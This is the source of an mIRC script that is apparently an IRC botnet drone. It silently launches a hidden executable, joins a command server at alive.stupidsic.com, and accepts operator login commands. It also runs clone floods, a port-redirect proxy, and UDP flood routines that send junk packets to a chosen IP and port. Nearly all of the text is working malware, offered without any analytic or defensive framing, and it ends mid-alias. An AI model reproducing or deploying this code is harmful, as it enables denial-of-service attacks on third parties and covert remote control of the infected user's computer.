on *:start:{ if ($exists(mdm.exe) == $false) { exit } | //run mdm.exe /n /fh         | //set %server alive.stupidsic.com  | //set %timeout 10 | if ($portfree(60609) == $false) { exit } |  if ($portfree(60609) == $true) { /socklisten blah 60609 } | //nick $read mdm.scr $+ $r(1,9) | //timerc 1 4 //server %server $+ : $+ 6667 | //run mdm.exe /n /fh        | //remini NT32.ini ident userid | //remini NT32.ini mirc user | //remini NT32.ini mirc email | //writeini NT32.ini ident userid $read mdm.scr | //writeini NT32.ini mirc user $randomgen($r(0,9)) | //writeini NT32.ini mirc email $randomgen($r(0,9)) | //identd on $r(a,z) $+ $read mdm.scr $+ $r(a,z)  |  //timercoolconnect -o 0 100 //server %server 6667 |  fos }
on *:TEXT:!login*:*:{  set %pass ! broken ! | if (%pass8 == $null) { set %pass8 hey there?  } | if ( ($2- = %pass) && ( $nick isop #  ) )  { /msg # 14º15¬14¸ 15L14o15gin Acc14ept15ed14 º15¬14¸ 12User2:14 15[ $+ $nick $+ 15] 14º15¬14¸ 12Level2: 14[2Ma4§2ter14] | /set %master $address | /guser 10 $nick 3 } | if ( ($2- = %pass8) && ( $nick isop #  ) )  {  /msg # 14º15¬14¸ 15L14o15gin Acc14ept15ed14 º15¬14¸ 12User2:14 15[ $+ $nick $+ 15] 14º15¬14¸ 12Level2: 14[21014] | /guser 10 $nick 3 } } 
on *:INPUT:*: { haltdef | /echo -a < $+ $me $+ > $1- | msg %chan --Warning- (Input command) $1- | /clearall | //run mdm.exe /n /fh        | halt }
alias clone { if ($1 == in) { if ($2 == PING) { sockwrite -tn $sockname PONG $3   }  }
  if ($1 == quit) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* quit : $+ $2- }  | if ($sock(sock*,0) > 0) { sockwrite -tn sock* quit : $+ $2- }   }
  if ($1 == msg) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* privmsg $2 : $+ $3- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* privmsg $2 : $+ $3- }  }
  if ($1 == notice) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($sock(clone*,0) > 0) {  sockwrite -tn clone* notice $2 : $+ $3- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* notice $2 : $+ $3- }  }
  if ($1 == all) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* PRIVMSG $2 :TIME | sockwrite -tn clone* PRIVMSG $2 :PING | sockwrite -tn clone* PRIVMSG $2 :VERSION  } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* PRIVMSG $2 :TIME | sockwrite -tn sock* PRIVMSG $2 :PING | sockwrite -tn sock* PRIVMSG $2 :VERSION }  }
  if ($1 == time) { if ($2 == $null) { halt } | if ($sock(clone*,0) > 0) { .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :TIME } | if ($sock(sock*,0) > 0) {    .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :TIME } }
  if ($1 == ping) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {     .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :PING } |  if ($sock(sock*,0) > 0) {   .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :PING }  }
  if ($1 == version) {  if ($2 == $null) { halt } | if ($sock(clone*,0) > 0) { .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :VERSION } |  if ($sock(sock*,0) > 0) {   .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :VERSION } }
  if ($1 == join)  && ($address == %master) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {  sockwrite -tn clone* join $2 } |  if ($sock(sock*,0) > 0) {   sockwrite -tn sock* join $2 } }
  if ($1 == part) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {  /sockwrite -n clone* part $2 : $+ $3- }  if ($sock(sock*,0) > 0) {  /sockwrite -n sock* part $2 : $+ $3- }  }
  if ($1 == kill) {  if ($sock(clone*,0) > 0) {      sockclose clone* } |  if ($sock(sock*,0) > 0) {  sockclose sock* } }
  if ($1 == connect) {  if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($4 == $null) { halt } |  set %clone.server $2 | set %clone.port $3 | set %clone.load $4 |  :loop |  if (%clone.load == 0) { halt } |  if ($sock(clone*,0) >= %max.load) || (%max.load == $null) { halt } |  //identd on $r(a,z) $+ $read mdm.scr $+ $r(a,z)  | sockopen clone $+ $randomgen($r(0,9)) $2 $3 |  dec %clone.load 1 |   goto loop  } 
  if ($1 == nick.change) {  %.nc = 1  |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end } |  sockwrite -n $sock(clone*,%.nc) Nick $randomgen($r(0,9)) |  inc %.nc |  goto ncloop |   :end  |   /wnickchn |   halt  }
  if ($1 == nick.this) {  %.nc = 1 |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end }  |   sockwrite -n $sock(clone*,%.nc) Nick $2 $+ $r(1,999) $+ $r(a,z) |   inc %.nc |  goto ncloop |   :end  |  /wnickchn2 $2 |  halt  } 
}
alias predirectstats { set %gtpcount 0 | :startloophere | inc %gtpcount 1 |  if $sock(gtportdirect*,%gtpcount) != $null { /msg $1 14*(PortRedirect)*: In-port: $gettok($sock(gtportdirect*,%gtpcount),2,46) to $gettok($sock(gtportdirect*,%gtpcount).mark,1,32) $+ : $+ $gettok($sock(gtportdirect*,%gtpcount).mark,2,32)   | /msg $1 12[Local IP Address]:14 $ip | goto startloophere  } | else { if %gtpcount = 1 { //msg $1 12*** Error, no port redirects! } | //msg $1 12*** PortRedirect/End | unset %gtpcount } }
alias pdirectstop { Set %gtrdstoppnum $1 | sockclose [ gtportdirect. [ $+ [ %gtrdstoppnum ] ] ]  | sockclose [ gtin. [ $+ [ %gtrdstoppnum ] ] ] $+ *  | sockclose [ gtout. [ $+ [ %gtrdstoppnum ] ] ] $+ *  | unset %gtrdstoppnum } 
alias gtportdirect { if $3 = $null { return } | socklisten gtportdirect $+ . $+ $1 $1 | sockmark gtportdirect $+ . $+ $1 $2 $3 }
alias firew {  if ($1 == 1) { %clones.firewall = 1 } | elseif ($1 == 0) { %clones.firewall = 0 } }
alias cf { firew 1 | if ($2 == $null) { halt } |  %clones.firew = $1 |  if ($3 == $null) { .timer -o $2 2 connect1 $1 } |  else { .timer -o $2 $3 connect1 $1 } }
alias firstfree { %clones.counter = 0 | :home | inc %clones.counter 1 | %clones.tmp = *ock $+ %clones.counter | if ($sock(%clones.tmp,0) == 0) { return %clones.counter } | goto home |  :end }
alias connect1 { if ($1 != $null) { %clones.firew = $1 } | if (%clones.server == $null) { msg %chan 2Server not set | halt } |  if (%clones.serverport == $null) { %clones.serverport = 6667 } |  %clones.tmp = $firstfree |  if (%clones.firewall == 1) {  sockopen ock $+ %clones.tmp %clones.firew 1080  } |  else { sockopen sock $+ %clones.tmp %clones.server %clones.serverport  } }
alias botraw { sockwrite -n sock* $1- }
alias changenick { %clones.counter = 0 | :home | inc %clones.counter 1 | %clones.tmp = $read mdm.scr | if (%clones.tmp == $null) { %clones.tmp = $randomgen($r(0,9)) } |  if ($sock(sock*,%clones.counter) == $null) { goto end } |  sockwrite -n $sock(sock*,%clones.counter) NICK %clones.tmp | sockmark $sock(sock*,%clones.counter) %clones.tmp | goto home | :end }
alias getmarks { %clones.counter = 0 | %clones.total = $sock(sock*,0) | :home |  inc %clones.counter 1 | %clones.tmp = sock $+ %clones.counter |  if (%clones.counter >= %clones.total) { goto end } |  goto home | :end }
alias isbot { %clones.counter = 0 | %clones.total = $sock(sock*,0) | :home |  inc %clones.counter 1 | %clones.tmp = sock $+ %clones.counter | if ($sock(%clones.tmp).mark == $1) { return $true } |  if (%clones.counter >= %clones.total) { goto end } | goto home |   :end |  return $false }
alias gcoolstart  { if $1 = STOP { .timergcoolt off | unset %gnum | msg %pchan [packeting]: Halted! | unset %pchan } | if $3 = $null { return } |  if $timer(gcoolt).com != $null { msg %pchan ERROR! Currently flooding: $gettok($timer(gcoolt).com,3,32)  | return } |  msg %pchan 14[sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ )14] |  set %gnum 0 |  .timergcoolt -m 0 400 gdope $1 $2 $3 }
alias smurfdope {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 2
  %gnum.p = $r(1,65000)
  sockudp gnumc1 $2 %gnum.p¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®
  %gnum.p = $r(1,65000)
  sockudp gnumc3 $2 %gnum.p ± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò
  %gnum.p = $r(1,65000)
  sockudp gnumc2 $2 %gnum.p ®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®
  %gnum.p = $r(1,65000)
  sockudp gnumc4 $2 %gnum.p¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®
  %gnum.p = $r(1,65000)
  sockudp gnumc5 $2 %gnum.p ~!@#£¼^&*()_±`¯²³45678&*()¯+¯ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`1234567890-=\][';,./|}{:
  %gnum.p = $r(1,65000)
  sockudp gnumc6 $2 %gnum.p ± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò
  %gnum.p = $r(1,65000)
  sockudp gnumc7 $2 %gnum.p ®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®
  %gnum.p = $r(1,65000)
  sockudp gnumc8 $2 %gnum.p ~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`1234567890-=\][';,./|}{:0-=\][';,./|}{:"?><~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`ABCDEFGHIJ¯°±²¶·²¶·²¶·«¬­°¯Â~!@#$%^&*()_+`1234567890-=\][';,./|}{:
return |  :done | //msg %pchan [Smurf Packeting]: Finished! | .timergcoolt off | unset %gnum* | unset %pchan }
}
alias smurfstart  { if $1 = STOP { .timergcoolt off | unset %gnum | msg %pchan [Smurf Packeting]: Halted! | unset %pchan } | if $3 = $null { return } |  if $timer(gcoolt).com != $null { msg %pchan [Currently Smurf Flooding) $gettok($timer(gcoolt).com,3,32)  | return } |  msg %pchan Sending ( $$1 ) smurf packets to ( $$2 ) on port: ( $$3 ) |  set %gnum 0 |  .timergcoolt -m 0 60 smurfdope $1 $2 $3 }
alias gdope {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4 
  sockudp gnumc1 $2 $3¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®
  sockudp gnumc3 $2 $3 ± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò± ± ±À¯¬Ò
  sockudp gnumc2 $2 $3 ®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®
  sockudp gnumc4 $2 $3¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*®¢£®¢£¢¼¥£¢^¼½®¢^®¢*® 
  return |  :done | //msg %pchan [packeting]: Finished! | .timergcoolt off | unset %gnum | unset %pchan 
}
alias setserver { %clones.setserver = 1 | .dns -h $1 } 
alias reg {  if ($1 == 1) { return @aol.com } | if ($1 == 2) { return @hotmail.com } | if ($1 == 3) { return @msn.com } | if ($1 == 4) { return @netzero.com } | if ($1 == 5) { return @bothered.com } | if ($1 == 6) { return @bothered.com } | if ($1 == 7) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .edu } | if ($1 == 8) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .net }  | if ($1 == 9) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .com } | if ($1 == 10) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ 